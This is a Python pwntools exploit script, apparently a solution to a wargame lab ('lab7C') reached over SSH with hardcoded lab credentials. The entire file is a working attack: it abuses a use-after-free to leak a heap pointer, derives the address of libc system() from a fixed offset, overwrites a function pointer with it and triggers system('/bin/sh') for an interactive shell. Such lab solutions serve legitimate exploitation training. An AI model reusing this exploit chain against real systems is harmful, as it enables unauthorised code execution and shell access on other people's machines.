#!/usr/bin/env python3

from pwn import *
from time import sleep
exe = ELF("./lab7C_patched")
libc = ELF("./libc-2.19.so")
ld = ELF("./ld-2.19.so")

context.binary = exe
#context.log_level='debug'
#p=exe.process()
#gdb.attach(p,gdbscript="b *main+810\nb *main+907")
s=ssh(user="lab7C",password="lab07start",host="192.168.1.18",port=22)
p=s.run("/levels/lab07/lab7C")
def malloc_string(data:bytes):
    p.recv()
    p.sendline(b"1")
    p.sendline(data)
def malloc_num(num:int):
    p.recv()
    p.sendline(b"2")
    p.sendline(str(num).encode())
def del_string():
    p.recv()
    p.sendline(b'3')
def del_num():
    p.recv()
    p.sendline(b'4')
def print_string(index:int):
    p.recv()
    p.sendline(b'5')
    p.recv()
    p.sendline(str(index).encode())
    sleep(1)
    return p.recv()[0:4][::-1]
def print_num(index:int):
    p.recv()
    p.sendline(b'6')
    p.recv()
    p.sendline(str(index).encode())
    p.recvuntil(b":")
    sleep(1)
    return int(p.recvuntil(b'\n').decode().rstrip())
malloc_num(100)#leak small_str
sleep(1)
del_num()
sleep(1)
malloc_string(b'AAA')
sleep(1)
small_str=print_num(1)
sleep(1)

log.info(f"small_str: {hex(small_str)}")
libc_system=small_str-0x19da37#fucking old kernel

malloc_string(b"/bin/sh\x00")
sleep(1)
del_string()
sleep(1)
malloc_num(libc_system)
print_string(2)
context.log_level='info'
p.interactive()
